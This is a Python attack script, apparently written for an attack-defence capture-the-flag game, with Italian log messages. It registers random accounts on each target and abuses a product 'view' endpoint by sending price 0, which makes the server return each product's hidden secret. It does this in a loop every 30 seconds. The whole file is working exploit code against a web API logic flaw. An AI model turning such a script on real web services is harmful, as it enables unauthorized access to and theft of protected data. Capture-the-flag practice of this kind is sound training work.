import requests,time,json,rstr;
from datetime import datetime;

ips = ["localhost"]
round_time = 30

def login(ip):
	r = requests.Session()
	username = rstr.rstr(rstr.letters(),6,20)
	password = rstr.rstr(rstr.letters(),6,20)
	data = {"username": username, "password": password}
	x = r.post(f"http://{ip}:8080/api/users/register", json = data)
	return r


def attack(ip):
	newFlags = []
	req1 = requests.get(f"http://{ip}:8080/api/products/")
	products = req1.json()
	session = login(ip)
	for entry in products:
		data = {"productId":entry['id'] , "price":0}
		req2 = session.post(f"http://{ip}:8080/api/products/view", json = data)
		response = req2.json()
		newFlags.append(response['secret'])
	return newFlags   



def main():
	round = 0
	while True :
		flags = []
		print(f"Inizio round {round} - {datetime.now().strftime('%H:%M:%S')}\n")
		for ip in ips:
		        newFlags = []
		        
		        try:
		        	newFlags = attack(ip)
		        except Exception as e:
		        	print(f"-	Eccezione catturata: l'indirizzo {ip} si Ã¨ difeso\n")
		        	continue
							
		        print(f"-       Catturate {len(newFlags)} nuove flag dall'ip: {ip} - {newFlags}\n")
		        flags.extend(newFlags)
		
		print(f"Fine round {round} - Catturate {len(flags)} flag totali - {datetime.now().strftime('%H:%M:%S')}\n")
		#submit(flags)
		round+=1
		time.sleep(round_time)
		
main()
